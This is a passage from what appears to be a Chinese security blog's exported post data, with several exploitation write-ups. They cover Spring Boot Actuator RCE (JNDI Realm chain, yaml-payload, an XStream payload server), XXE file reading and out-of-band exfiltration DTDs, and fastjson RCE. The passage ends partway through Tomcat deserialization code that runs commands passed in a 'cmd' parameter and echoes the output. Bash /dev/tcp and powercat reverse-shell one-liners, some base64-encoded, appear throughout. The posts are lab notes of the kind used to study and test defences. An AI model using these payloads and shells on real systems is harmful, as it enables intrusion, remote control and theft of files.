&quot;attribute&quot;: &quot;connectionURL&quot;, &quot;value&quot;: &quot;rmi://127.0.0.1:1097/jndi&quot;&#125;#停止Realmstop_JNDIrealm = &#123; &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;operation&quot;: &quot;stop&quot;, &quot;arguments&quot;: []&#125;#运行Realm，触发JNDI 注入start = &#123; &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;operation&quot;: &quot;start&quot;, &quot;arguments&quot;: []&#125;expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]for i in expoloit: rep = req.post(url, json=i) pprint(rep.json()) yaml反序列化利用spring Cloud的spring.cloud.bootstrap.location属性配合yaml反序列化实现rce，参考https://github.com/artsploit/yaml-payload 12javac src/artsploit/AwesomeScriptEngineFactory.javajar -cvf yaml-payload.jar -C src/ . 向env端点post发送spring.cloud.bootstrap.location=http://x.x.x.x/yaml-payload.yml，其中yml内容为 12345!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&quot;http://127.0.0.1:9999/yaml-payload.jar&quot;] ]]] 之后post请求refresh端点触发。我这里失败了，只发起了向yml的http请求没有执行命令，应该是环境没有cloud。 xstream反序列化利用xstream反序列化。首先查看env中是否有netflix，或者configprops下有没有eureka，有的话可以利用，没有的话也不一定利用不了。开启python脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#-*-coding:utf8-*-# linux反弹shell #&lt;string&gt;bash&lt;/string&gt;#&lt;string&gt;-c&lt;/string&gt;#&lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.20.82/9999 0&gt;&amp;amp;1&lt;/string&gt;# windows反弹shell# &lt;string&gt;powershell&lt;/string&gt;# &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);&lt;/string&gt;# &lt;string&gt;powercat -c 192.168.123.1 -p 2333 -e cmd&lt;/string&gt;from flask import Flask, Responseapp = Flask(__name__)@app.route(&#x27;/xstream&#x27;, defaults=&#123;&#x27;path&#x27;: &#x27;&#x27;&#125;)@app.route(&#x27;/xstream/&lt;path:path&gt;&#x27;)def catch_all(path): xml = &quot;&quot;&quot;&lt;linked-hash-set&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;cmd.exe&lt;/string&gt; &lt;string&gt;/c&lt;/string&gt; &lt;string&gt;calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;/is&gt; &lt;/dataSource&gt; &lt;/dataHandler&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;/linked-hash-set&gt;&quot;&quot;&quot; return Response(xml, mimetype=&#x27;application/xml&#x27;)if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;, port=2333) 然后向env发起post请求eureka.client.serviceUrl.defaultZone=http://127.0.0.1:2333/xstream然后post请求refresh，触发命令。我这里实验是定时执行，一分钟两次。没啥新内容，就是整理记录一下，感觉最后一种好用一点。 参考链接https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-databasehttps://www.freebuf.com/column/234266.htmlhttps://www.veracode.com/blog/research/exploiting-spring-boot-actuatorshttps://www.cnblogs.com/junsec/p/12066305.html","categories":[],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://yoursite.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"xxe从入门到入门","slug":"xxe从入门到入门","date":"2020-05-26T13:09:43.000Z","updated":"2020-08-28T09:42:56.000Z","comments":true,"path":"2020/05/26/xxe从入门到入门/","link":"","permalink":"http://yoursite.com/2020/05/26/xxe%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8/","excerpt":"最近想把高危漏洞都总结一下，虽然都利用过，但没有好好整理，用的时候总会手忙脚乱。先从xxe开始","text":"最近想把高危漏洞都总结一下，虽然都利用过，但没有好好整理，用的时候总会手忙脚乱。先从xxe开始漏洞测试环境用的是java11+最新版webgoat，其中有专门的xxe部分。先简单介绍下xml的结构，比如有一个xml 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Person&gt; &lt;Name&gt;Bob&lt;/Name&gt; &lt;Age&gt;18&lt;/Age&gt;&lt;/Person&gt; 其中第一行是元数据，带上就行。person是根元素，一个xml只有一个,里面的name和age是子元素，可以有多个。xml标签中不能有特殊符号，比如尖括号等，因为会混淆格式。这时可以用实体(entites)解决。实体相当于变量，可以声明后多处引用。实体在DTD(document tyoe definition)部分被定义。加入DTD的xml比如 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE Person [ &lt;!ENTITY name &quot;Bob&quot;&gt;]&gt;&lt;Person&gt; &lt;Name&gt;&amp;name;&lt;/Name&gt; &lt;Age&gt;18&lt;/Age&gt;&lt;/Person&gt; DOCTYPE标识符代表DTD，其中定义了name变量。这种就是普通的引用实体。还有种实体是参数实体，后面再介绍。xxe的全称是xml external entites也就是外部实体(注入)，外部实体也就是从外部，比如本地文件或网络获取内容，自然可能会产生文件读取或ssrf之类的漏洞。比如 12345678910111213&lt;!DOCTYPE xxe [&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;output&gt;&amp;test;&lt;/output&gt;或者不写file&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE p [ &lt;!ENTITY x SYSTEM &quot;/proc/cpuinfo&quot;&gt; ]&gt;&lt;p&gt;&amp;x;&lt;/p&gt;php的话可以用伪协议&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE p [ &lt;!ENTITY x SYSTEM &quot;php://filter/rereadad=convert.base64-encode/resource=/var/www/html/flag.php&quot;&gt; ]&gt;&lt;p&gt;&amp;x;&lt;/p&gt; SYSTEM关键字就是外部实体的标志，会访问后面的url，这样输出就会是passwd文件的内容。这也就是最简单的xxe利用，直接回显(in-band)的xxe。和sql注入类似，除此之外还有报错(error-based)xxe和盲(blind)xxe也就是带外(out-of-band)/OOB)xxe。利用方法也更复杂一些。###blind xxe盲xxe也是最常见的类型，需要带外传输数据。那么很自然想到用http请求传递文件内容。这里就需要使用前面说过的参数实体。参数实体只能在DTD中引用，可以用一个实体给另一个实体赋值。但注意下面这种嵌套的用法(%name)只能在外部DTD中使用(文档是这么说明的，但实际实现不同语言和解析器会有差异)，也就是需要单独创建个DTD文件放在服务器上。 1234567891011&lt;!--name.dtd--&gt;&lt;!ENTITY % name &quot;Bob&quot; &gt;&lt;!ENTITY % outer &quot;&lt;!ENTITY inner &#x27;my name is %name;&#x27;&gt;&quot;&gt; %outer;&lt;!--main.xml--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;http://ip/name.dtd&quot;&gt;&lt;Person&gt; &lt;Name&gt;&amp;inner;&lt;/Name&gt; &lt;Age&gt;18&lt;/Age&gt;&lt;/Person&gt; 那么带外传输数据可以这样，比方写个1.txt内容是test xxe，运行后可以在监听端收到GET /test%20xxe的请求 12345678&lt;!--evil.dtd--&gt;&lt;!ENTITY % passwd SYSTEM &quot;file:///C:/xxx/1.txt&quot;&gt;&lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM &#x27;http://ip/%passwd;&#x27;&gt;&quot;&gt;%wrapper;&lt;!--main.xml--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;http://ip/evil.dtd&quot;&gt;&lt;output&gt;&amp;send;&lt;/output&gt; 也可以用参数实体，这时DTD中嵌套实体部分需要编码 123456789101112&lt;!--evil.dtd--&gt;&lt;!ENTITY % passwd SYSTEM &quot;file:///C:/xxx/1.txt&quot;&gt;&lt;!ENTITY % wrapper &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip/%passwd;&#x27;&gt;&quot;&gt;%wrapper;&lt;!--main.xml--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;%dtd;%send;]&gt;&lt;output&gt;123&lt;/output&gt; 这样就相当于直接引入实体send，请求ip加passwd信息。看上去很完美。但实际上这样还是会出现问题，比如文件中包含特殊字符(主要是尖括号)和换行时都会导致xml或url的解析问题，这就需要新的解决方法。解决尖括号的方法是利用CDATA 1&lt;![CDATA[ &lt;text&gt; ]]&gt; 其中的标签不会被解析，那么就可以用CDATA把读取的文件内容包起来，在外部DTD中拼接，比如1.txt中内容改为 1asd&lt;button onmouseover=alert(1)&gt; 12345&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;file:///C:/xxx/1.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % wrapper &quot;&lt;!ENTITY all &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt; %wrapper; 然后在xml中调用all实体就可以获取带有尖括号的字符串了，某些情况下还可以形成存储xss。本地环境我试了下，回显时会受到尖括号影响，带外时不需要CDATA也可以正常获取带尖括号的数据，但是无法正常获取带#号的数据，因为按url处理掉了。但是带外的过程还会有个问题，就是出现换行符时，url解析会报错。php环境的话很简单，用filter来base64一下就可以了。java中需要用ftp协议，并且只有低版本(leadroyal给出 &lt;7u141 和 &lt;8u162)可以，高版本也对换行做了限制。并且ftp协议中?、#等特殊符号也会被截断。可以利用工具xxe-ftp-server所以高版本java读取多行文件就只能依赖服务器的报错了，比如DTD内容为 123&lt;!ENTITY % passwd SYSTEM &quot;file:///C:/wamp/1.txt&quot;&gt;&lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM &#x27;%passwd;&#x27;&gt;&quot;&gt;%wrapper; 这样服务器就会报一个no protocol: 文件内容，并且其中所有内容包括多行内容及特殊字符都会打印。一次性解决上面的问题。这就属于报错xxe。前面说的都是利用外部DTD，那不允许请求外网服务器DTD怎么办？还有种攻击手法是利用本地DTD。这种手法也可以算一种更复杂的OOB的方法。首先需要利用本地存在的DTD文件，每个系统都有一些内置的，比如ubuntu系统自带的/usr/share/yelp/dtd/docbookx.dtd，这里存在许多参数实体，随便选一个比如ISOamsa，然后重写它，最开始的版本是这么写的 123456789101112&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY % ISOamsa &#x27; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://myip/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#x27;&gt; %remote;]&gt;&lt;message&gt;1234&lt;/message&gt; 其实和前面的方法相比，就是多了一步重写参数实体，但是前面不是说了内部DTD不允许嵌套实体吗？这里用的是外部DTD在内部重写，并且用了三层嵌套。分析下是哪一点起了作用，首先试试外部DTD重写，两层嵌套 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY % file SYSTEM &quot;file:///C:/wamp/1.txt&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % ISOamsa &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip/?%file;&#x27;&gt;&quot;&gt;%dtd;%send;]&gt; 失败了，和之前直接在内部DTD引用参数实体一样。那么改成内部DTD，三层嵌套呢？ 12345678910&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % file SYSTEM &quot;file:///C:/wamp/1.txt&quot;&gt; &lt;!ENTITY % test &#x27; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://ip/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#x27;&gt; %test;]&gt; 还是失败了，网上有的帖子这样是可以的，但他们的环境都是php的，可能是解析器不同。试试四层？ 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY % para1 SYSTEM &quot;file:///C:/wamp/1.txt&quot;&gt; &lt;!ENTITY % para4 &quot; &lt;!ENTITY &amp;#x25; para &#x27; &lt;!ENTITY &amp;#x26;#x25; para2 &amp;#x22;&lt;!ENTITY &amp;#x26;#x26;#x25; error SYSTEM &amp;#x26;#x27;http://ip/&amp;#x26;#x25;para1;&amp;#x26;#x27;&gt;&amp;#x22;&gt; &amp;#x26;#x25;para2; &amp;#x26;#x25;error; &#x27;&gt; &amp;#x25;para;&quot;&gt;%para4;]&gt; 还是不行，引入外部DTD的话可以。所以java11环境下应该是只有外部DTD+三层以上嵌套调用才能解析，否则是不行的。也可以改成报错的版本，把send那里的url改了就行，这也是不出网情况下唯一的解决方案了。###利用方式有回显–&gt;回显xxe，不需要引入实体有报错–&gt;外网DTD报错、本地DTD报错无报错–&gt;外网DTD盲xxe、本地DTD盲xxe###漏洞点首先如果请求里有明显xml标签就可能有xxe。如果请求是json，转化成xml格式可能存在xxe，这是后端restful写法导致的。再就是其他格式文档，docx、xslx、pptx、pdf、svg等等，如果被解析了的话都有可能存在xxe。###一些差异前面自己的实验和网上的帖子有很多矛盾的地方，怀疑是解析器的区别。所以又启动了一个phpstudy的php7.3.4+xml2.9.9的服务测试下，服务端代码 1234567&lt;?php$xmlfile = file_get_contents(&#x27;php://input&#x27;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);print_r($creds);?&gt; 网上都用的这个代码，很奇怪我没有开启allow_url_include但也可以用php://input。好像是file_get_contents可以，include不行，跟网上说的又不一样。和文档的说明不同，这段php代码可以在内部DTD中嵌套实体 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % name &quot;Bob&quot; &gt;&lt;!ENTITY % outer &quot;&lt;!ENTITY inner &#x27;my name is &amp;#x25;name;&#x27;&gt;&quot;&gt; %outer;]&gt;&lt;Name&gt;&amp;inner;&lt;/Name&gt; 读文件 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send &#x27;&amp;#x25;file;&#x27;&gt;&quot;&gt;%all;]&gt;&lt;roottag&gt;&amp;send;&lt;/roottag&gt; 三层都不需要，两层就可以了，还要啥自行车。不过这是回显条件下的。带外时可以用三层，同样不需要外部DTD 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/wamp/1.txt&quot;&gt; &lt;!ENTITY % test &#x27; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://127.0.0.1:9988/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#x27;&gt; %test;]&gt; 还可以利用filter实现双层嵌套带外，顺便绕过某些关键字过滤，php的各种花样都可以用了。 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % sp SYSTEM &quot;php://filter/resource=data://text/plain;base64,PCFFTlRJVFkgJSBkYXRhIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1maWxlOi8vL0M6L3dhbXAvMS50eHQiPg0KPCFFTlRJVFkgJSBwYXJhbTEgJzwhRU5USVRZIGV4ZmlsIFNZU1RFTSAiaHR0cDovLzEyNy4wLjAuMTo5OTg4LyVkYXRhOyI+Jz4=&quot;&gt;%sp; %param1;]&gt;&lt;Name&gt;&amp;exfil;&lt;/Name&gt; 最好的语言，最好的语言(拱手 参考链接https://www.youtube.com/watch?v=gjm6VHZa_8shttps://www.freebuf.com/vuls/207639.htmlhttps://www.leadroyal.cn/?p=914https://cloud.tencent.com/developer/article/1500898https://github.com/LandGrey/xxe-ftp-server","categories":[],"tags":[]},{"title":"fastjson rce利用踩坑","slug":"fastjson-rce利用踩坑","date":"2020-05-25T02:21:58.000Z","updated":"2020-06-11T03:08:28.000Z","comments":true,"path":"2020/05/25/fastjson-rce利用踩坑/","link":"","permalink":"http://yoursite.com/2020/05/25/fastjson-rce%E5%88%A9%E7%94%A8%E8%B8%A9%E5%9D%91/","excerpt":"用burp插件扫到个fastjson，找了个工具测试curl，很快收到了请求，感觉很简单想执行别的命令看看，结果一个周末就搭上面了","text":"用burp插件扫到个fastjson，找了个工具测试curl，很快收到了请求，感觉很简单想执行别的命令看看，结果一个周末就搭上面了用的工具是群里少宇推荐的fastjson_rce_tool，很好用，唯一的问题是只能执行一条命令，不能定制java脚本。嫌麻烦我懒得自己启jndi服务什么的，就想用这个工具直接弹shell。结果试了各种弹shell的方法都失败了，很迷惑。然后考虑curl带外，这里一个很坑的地方是如果直接在参数写”curl ip/whoami“这种的话，反引号的内容实际上是在本机解析的，也就是查看的是自己的whoami，当时用ifconfig看到自己的ip时候才明白过来。那就只能用curl读读文件curl -F file=@/etc/passwd ip这样。要执行命令就要用到管道，本来想base64的，但是好像目标没有base64。最后的解决办法是’echo “curl ip/pwd“ | /bin/bash’终于成功执行了命令。但很奇怪的是直接curl的时候源ip和用bash执行时候的源ip不一样，后一台还会隔几分钟，不太清楚负载什么怎么做的。看了下pwd是/root/bash_sandbox_samples/随机字符，这样的一个目录，那应该是一个删减的shell，功能比较少。还是不知道怎么处理多行返回值。最后在CaijiOrz的工具找到了一个神奇的命令 1/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1 弹出来了，给力还有 12/bin/bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;/dev/tcp/127.0.0.1/8888&lt;&amp;1/bin/bash -c $*|bash 0 echo bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1 来自https://blog.spoock.com/2018/11/25/getshell-bypass-exec/还找到个以前记录过的，也可以 1bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjQ3Ljc2LjUxLzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 感觉自己好像瞎，明明之前有个ctf的反序列化题里看wp复制下来的。。。看来别人帮踩了坑也没有用，自己还是会掉里面。看来是java的执行shell方式有些独特，分割会有问题。原理https://b1ngz.github.io/java-os-command-injection-note/http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/参考链接https://github.com/wyzxxz/fastjson_rce_toolhttps://github.com/CaijiOrz/fastjson-1.2.47-RCEhttps://blog.spoock.com/2018/11/25/getshell-bypass-exec/","categories":[],"tags":[]},{"title":"java反序列化回显自闭之旅","slug":"java反序列化回显自闭之旅","date":"2020-04-24T08:50:08.000Z","updated":"2020-05-22T08:05:26.000Z","comments":true,"path":"2020/04/24/java反序列化回显自闭之旅/","link":"","permalink":"http://yoursite.com/2020/04/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/","excerpt":"最近看见很多java反序列化回显的文章，用来解决内网rce不出网的情况，边学边记录一下。","text":"最近看见很多java反序列化回显的文章，用来解决内网rce不出网的情况，边学边记录一下。因为有那么多的框架和中间件，肯定没办法面面俱到，主要关注tomcat下通用的回显方法。先整理下tomcat的架构以及运行流程，观察下可以利用的地方。首先tomcat可以总体分为两部分：连接器和容器，对应到代码里就是Coyote和Catalina，如图： 从图中看出，客户端发送socket请求到Coyote，coyote处理后得到Request对象，CoyoteAdapter处理后封装为servlet对象传递给Catalina。细致的过程如图 所以可以直接找servlet对象，也可以找原生的Coyote的Request对象，因为servlet也是由request而来的。实际上应该是后者方便一些，因为调用链越长越复杂。不过最早被分享的方法是直接找servlet的，是一个tomcat下半通用的思路，来自kingkk(https://xz.aliyun.com/t/7348)。具体方法是在org.apache.catalina.core.ApplicationFilterChain找到lastServicedResponse，获取ServletResponse。可以观察下图的tomcat的web请求流程，读代码可以发现filterChain中是封装了servlet的。 测试用的springmvc，需要导入tomcat8.5的jar包，分析写在注释里了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package cn.halfblue.controller;import org.apache.catalina.connector.Response;import org.apache.catalina.connector.ResponseFacade;import org.apache.catalina.core.ApplicationFilterChain;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.Field;import java.lang.reflect.Modifier;import java.util.Scanner;@Controllerpublic class testResController &#123; @RequestMapping(&quot;vuln8&quot;) @ResponseBody public String vuln8(String input) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; Field WRAP_SAME_OBJECT_FIELD = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);//以下几行为反射修改private static final变量的流程 Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;); Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;); Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;); modifiersField.setAccessible(true); modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL); modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL); modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL); WRAP_SAME_OBJECT_FIELD.setAccessible(true); lastServicedRequestField.setAccessible(true); lastServicedResponseField.setAccessible(true); ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(null);//获取实例 ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(null);//同上 boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);//同上 String cmd = lastServicedRequest != null ? lastServicedRequest.get().getParameter(&quot;cmd&quot;) : null;//获取cmd参数的值 if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) &#123; lastServicedRequestField.set(null, new ThreadLocal&lt;&gt;());//赋值 lastServicedResponseField.set(null, new ThreadLocal&lt;&gt;());//赋值 WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);//赋值 &#125; else if (cmd != null) &#123;//回显内容 ServletResponse responseFacade = lastServicedResponse.get();//获取当前请求response java.io.Writer w = responseFacade.getWriter(); Field responseField = ResponseFacade.class.getDeclaredField(&quot;response&quot;);//修改usingwriter，让页面可以写正常内容以及命令回显 responseField.setAccessible(true); Response response = (Response) responseField.get(responseFacade); Field usingWriter = Response.class.getDeclaredField(&quot;usingWriter&quot;); usingWriter.setAccessible(true); usingWriter.set(response, Boolean.FALSE); boolean isLinux = true;//执行命令 String osTyp = System.getProperty(&quot;os.name&quot;); if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123; isLinux = false; &#125; String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, cmd&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(&quot;\\\\a&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; w.write(output); w.flush(); &#125; return input; &#125;&#125; 注意的点主要有反射修改private static final值的方法，以及反射修改usingwriter的值，否则会爆getWriter() has already been called for this response错误，但其实不影响执行命令。但这个方法的问题在于，service(request, response)是在所有filter执行完毕后运行的，如果执行代码的过程本身就在filter中(如shiro反序列化)，那么就没办法获取到servlet对象了。上边的方法是改变了tomcat请求的流程。另外的思路是直接找全局的response调用。这种思路就是在容器(Catalina)的处理逻辑之前找到Request对象，也就是在连接器(Coyote)内直接找processor。 后面的几种思路都是基于这个过程，不同的是获取processor的流程。第一种方法是来自Litch1(https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651374294&amp;idx=3&amp;sn=82d050ca7268bdb7bcf7ff7ff293d7b3)利用Thread.currentThread().getContextClassLoader()类加载器直接获取全局context，然后获取service下的connector–&gt;protocolHandler–&gt;processor–&gt;Request。测试用的springboot(spring initializr真省事)，思路写在注释里。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677@RestControllerpublic class vulnController &#123; @RequestMapping(&quot;/vuln&quot;) public void vuln() throws NoSuchFieldException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, IOException, ClassNotFoundException &#123; try &#123; //传递的参数，后门标识 String pass = &quot;resp&quot;; //获取WebappClassLoaderBase org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); //获取ApplicationContext java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(&quot;context&quot;); contextField.setAccessible(true); org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext()); //获取StandardService java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(&quot;service&quot;); serviceField.setAccessible(true); org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext); //获取Connector org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors(); //找到指定的Connector for (int i = 0; i &lt; connectors.length; i++) &#123; if (connectors[i].getScheme().contains(&quot;http&quot;)) &#123; //获取protocolHandler、connectionHandler org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler(); java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(&quot;getHandler&quot;, null); getHandlerMethod.setAccessible(true); org.apache.tomcat.util.net.AbstractEndpoint.Handler connectionHandler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler, null); //获取RequestGroupInfo java.lang.reflect.Field globalField = Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;).getDeclaredField(&quot;global&quot;); globalField.setAccessible(true); org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectionHandler); //获取RequestGroupInfo中储存了RequestInfo的processors java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(&quot;processors&quot;); processorsField.setAccessible(true); java.util.List list = (java.util.List) processorsField.get(requestGroupInfo); for (int k = 0; k &lt; list.size(); k++) &#123; org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) list.get(k); if (requestInfo.getCurrentQueryString().contains(pass)) &#123; //获取request 